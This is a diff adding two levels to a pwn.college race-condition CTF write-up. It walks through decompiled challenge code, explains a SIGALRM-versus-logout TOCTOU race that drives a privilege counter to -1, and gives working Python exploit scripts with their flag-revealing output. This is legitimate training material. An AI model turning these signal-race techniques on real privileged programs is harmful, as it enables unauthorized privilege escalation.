@@ -2292,3 +2292,415 @@ hacker@race-conditions~level6-1:~$ python ~/script.py
 pwn.college{gdJUNlscBjleeiCj6Lg_IeFOHWs.0lMxQDL4ITM0EzW}
 ### Goodbye!
 ```
+
+&nbsp;
+
+## level7.0
+
+> Exploit a race condition in a more realistic scenario to affect program behavior.
+
+```text
+hacker@race-conditions~level7-0:~$ /challenge/babyrace_level7.0
+###
+### Welcome to /challenge/babyrace_level7.0!
+###
+
+Privilege level: 0
+[*] Function (login/logout/win_authed/quit):
+```
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level7.0 :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  challenge((unsigned int)argc, argv, envp);
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+```c title="/challenge/babyrace_level7.0 :: challenge() :: Pseudocode" showLineNumbers
+int challenge()
+{
+  int result; // eax
+  char s1[136]; // [rsp+20h] [rbp-90h] BYREF
+  unsigned __int64 v2; // [rsp+A8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  signal(14, timeout_handler);
+  while ( 1 )
+  {
+    printf("Privilege level: %d\n", (unsigned int)privilege_level);
+    puts("[*] Function (login/logout/win_authed/quit): ");
+    __isoc99_scanf("%127s", s1);
+    result = strcmp(s1, "quit");
+    if ( !result )
+      return result;
+    if ( !strcmp(s1, "login") )
+    {
+      puts("Privilege level set to 1.");
+      puts("Paused (press enter to continue)");
+      __isoc99_scanf("%7s", &pause_buffer);
+      privilege_level = 1;
+      puts("You will be logged out in 10 minutes!");
+      alarm(0x258u);
+    }
+    else if ( !strcmp(s1, "logout") )
+    {
+      if ( privilege_level )
+      {
+        puts("Dropping one privilege level.");
+        puts("Paused (press enter to continue)");
+        __isoc99_scanf("%7s", &pause_buffer);
+        --privilege_level;
+      }
+      else
+      {
+LABEL_11:
+        puts("You are not logged in!");
+      }
+    }
+    else if ( !strcmp(s1, "win_authed") )
+    {
+      if ( !privilege_level )
+        goto LABEL_11;
+      if ( privilege_level == 1 )
+        puts("Your privilege level is too low!");
+      else
+        win();
+    }
+    else
+    {
+      puts("Unrecognized choice!");
+    }
+  }
+}
+```
+
+```c title="/challenge/babyrace_level7.0 :: win() :: Pseudocode" showLineNumbers
+__uid_t win()
+{
+  int *v0; // rax
+  char *v1; // rax
+  __uid_t result; // eax
+  int *v3; // rax
+  char *v4; // rax
+
+  puts("You win! Here is your flag:");
+  flag_fd_5683 = open("/flag", 0);
+  if ( flag_fd_5683 >= 0 )
+  {
+    flag_length_5684 = read(flag_fd_5683, &flag_5682, 0x100uLL);
+    if ( flag_length_5684 > 0 )
+    {
+      write(1, &flag_5682, flag_length_5684);
+      return puts("\n");
+    }
+    else
+    {
+      v3 = __errno_location();
+      v4 = strerror(*v3);
+      return printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
+    }
+  }
+  else
+  {
+    v0 = __errno_location();
+    v1 = strerror(*v0);
+    printf("\n  ERROR: Failed to open the flag -- %s!\n", v1);
+    result = geteuid();
+    if ( result )
+    {
+      puts("  Your effective user id is not 0!");
+      return puts("  You must directly run the suid binary in order to have the correct permissions!");
+    }
+  }
+  return result;
+}
+```
+
+The `win_authed` command calls `win()` only when `privilege_level` is neither `0` nor `1`:
+
+```c
+if (!privilege_level)        // 0 → "not logged in"
+    goto LABEL_11;
+if (privilege_level == 1)    // 1 → "too low"
+    puts("Your privilege level is too low!");
+else
+    win();                   // anything else → win
+```
+
+`login` always sets `privilege_level = 1` and `logout` always decrements it. Through normal sequential execution the only reachable values are `0` and `1` — never anything that triggers `win()`.
+
+### Signal Race
+
+The `timeout_handler` registered via `signal(SIGALRM, timeout_handler)` sets `privilege_level = 0` asynchronously when `SIGALRM` fires.
+
+The `logout` function has a critical TOCTOU window:
+
+```text
+1. Check:  if (privilege_level != 0) → passes when privilege_level = 1
+2. Pause:  scanf("%7s", &pause_buffer)  ← WINDOW
+3. Read:   eax = privilege_level
+4. Write:  privilege_level = eax - 1
+```
+
+The check at step 1 and the actual read at step 3 are not atomic — the pause sits between them. If we fire `SIGALRM` during this window, `timeout_handler` sets `privilege_level = 0` between the check and the read. Then logout reads `0` and writes `-1`.
+
+`-1` is neither `0` nor `1`, so `win_authed` calls `win()`.
+
+```text
+Timeline:
+  privilege_level = 1
+  logout: check → 1 != 0 ✓ → pause
+  SIGALRM fires → timeout_handler → privilege_level = 0
+  logout resumes → reads 0 → writes -1
+  win_authed: -1 != 0 and -1 != 1 → win() ✓
+```
+
+We send `SIGALRM` directly to the process using `os.kill(proc.pid, signal.SIGALRM)` during the logout pause window.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, threading, time, signal, os
+
+proc = subprocess.Popen(
+    ["/challenge/babyrace_level7.0"],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    close_fds=True
+)
+
+def reader():
+    while True:
+        line = proc.stdout.readline()
+        if not line:
+            break
+        print(line.decode(errors='replace'), end='', flush=True)
+
+threading.Thread(target=reader, daemon=True).start()
+
+def send(s):
+    proc.stdin.write((s + "\n").encode())
+    proc.stdin.flush()
+
+send("login")
+time.sleep(0.15)
+send("x")
+time.sleep(0.1)
+
+send("logout")
+time.sleep(0.15)
+
+os.kill(proc.pid, signal.SIGALRM)
+time.sleep(0.05)
+
+send("x")
+time.sleep(0.1)
+
+send("win_authed")
+time.sleep(0.5)
+
+send("quit")
+proc.stdin.close()
+proc.wait()
+```
+
+```text
+hacker@race-conditions~level7-0:~$ python ~/script.py
+###
+### Welcome to /challenge/babyrace_level7.0!
+###
+
+Privilege level: 0
+[*] Function (login/logout/win_authed/quit): 
+Privilege level set to 1.
+Paused (press enter to continue)
+You will be logged out in 10 minutes!
+Privilege level: 1
+[*] Function (login/logout/win_authed/quit): 
+Dropping one privilege level.
+Paused (press enter to continue)
+Logging out due to timeout.
+Privilege level: -1
+[*] Function (login/logout/win_authed/quit): 
+You win! Here is your flag:
+pwn.college{w1Gzb1UENa_4IiGlXEFCwgyfKui.01MxQDL4ITM0EzW}
+Privilege level: -1
+[*] Function (login/logout/win_authed/quit): 
+### Goodbye!
+```
+
+&nbsp;
+
+## level7.1
+
+> Exploit a race condition in a more realistic scenario to affect program behavior.
+
+```text
+hacker@race-conditions~level7-1:~$ /challenge/babyrace_level7.1
+###
+### Welcome to /challenge/babyrace_level7.1!
+###
+
+Privilege level: 0
+[*] Function (login/logout/win_authed/quit):
+```
+
+### Source code analysis
+
+```c title="/challenge/babyrace_level7.1 :: challenge() :: Pseudocode" showLineNumbers
+int challenge()
+{
+  int result; // eax
+  char s1[136]; // [rsp+20h] [rbp-90h] BYREF
+  unsigned __int64 v2; // [rsp+A8h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  signal(14, timeout_handler);
+  while ( 1 )
+  {
+    printf("Privilege level: %d\n", (unsigned int)privilege_level);
+    puts("[*] Function (login/logout/win_authed/quit): ");
+    __isoc99_scanf("%127s", s1);
+    result = strcmp(s1, "quit");
+    if ( !result )
+      break;
+    if ( !strcmp(s1, "login") )
+    {
+      privilege_level = 1;
+      alarm(0x258u);
+    }
+    else if ( !strcmp(s1, "logout") )
+    {
+      if ( privilege_level )
+      {
+        puts("Dropping one privilege level.");
+        --privilege_level;
+      }
+    }
+    else if ( !strcmp(s1, "win_authed") )
+    {
+      if ( privilege_level )
+      {
+        if ( privilege_level == 1 )
+          puts("Your privilege level is too low!");
+        else
+          win();
+      }
+      else
+      {
+        puts("You are not logged in!");
+      }
+    }
+    else
+    {
+      puts("Unrecognized choice!");
+    }
+  }
+  return result;
+}
+```
+
+This is identical to [level7.0](#level70) with one critical difference: the `scanf` pauses inside `login` and `logout` are gone. The exploit logic is the same — we need `privilege_level` to reach `-1` — but without the pauses the race window is no longer seconds wide. It shrinks to a few CPU instructions.
+
+The `logout` function still has a non-atomic read-modify-write:
+
+```asm
+1592: mov eax, [privilege_level]   ; read
+1598: sub eax, 0x1                 ; modify
+159b: mov [privilege_level], eax   ; write
+```
+
+And the check happens just before:
+
+```asm
+1558: mov eax, [privilege_level]
+155e: test eax, eax
+1560: je   LABEL_11
+```
+
+The race window is between `test eax,eax` (check sees 1) and `mov [privilege_level], eax` (decrement writes 0). If `SIGALRM` fires in that window, `timeout_handler` sets `privilege_level = 0`, and then the decrement writes `0 - 1 = -1`.
+
+Without a pause, this window is only a few nanoseconds. The only way to hit it is to fire `SIGALRM` at extremely high frequency while hammering `logout` continuously, relying on probability to eventually land the signal in the right nanosecond.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+import subprocess, threading, time, signal, os
+
+proc = subprocess.Popen(
+    ["/challenge/babyrace_level7.1"],
+    stdin=subprocess.PIPE,
+    stdout=subprocess.PIPE,
+    stderr=subprocess.STDOUT,
+    close_fds=True
+)
+
+def reader():
+    while True:
+        line = proc.stdout.readline()
+        if not line:
+            break
+        out = line.decode(errors='replace')
+        print(out, end='', flush=True)
+        if "pwn.college" in out:
+            os._exit(0)
+
+threading.Thread(target=reader, daemon=True).start()
+
+def send(s):
+    try:
+        proc.stdin.write((s + "\n").encode())
+        proc.stdin.flush()
+    except:
+        pass
+
+def alarm_spammer():
+    while True:
+        try:
+            os.kill(proc.pid, signal.SIGALRM)
+        except:
+            break
+        time.sleep(0.0001)
+
+threading.Thread(target=alarm_spammer, daemon=True).start()
+
+send("login")
+time.sleep(0.05)
+
+while True:
+    send("login")
+    send("logout")
+    send("win_authed")
+```
+
+```text
+hacker@race-conditions~level7-1:~$ python ~/script.py
+###
+### Welcome to /challenge/babyrace_level7.1!
+###
+
+Privilege level: 0
+[*] Function (login/logout/win_authed/quit):
+...
+Logging out due to timeout.
+You are not logged in!
+Privilege level: 0
+[*] Function (login/logout/win_authed/quit):
+Logging out due to timeout.
+You win! Here is your flag:
+Logging out due to timeout.
+Logging out due to timeout.
+Logging out due to timeout.
+pwn.college{MkRZF-oW341A1-jwOETkEKxPY9_.0FNxQDL4ITM0EzW}
+```
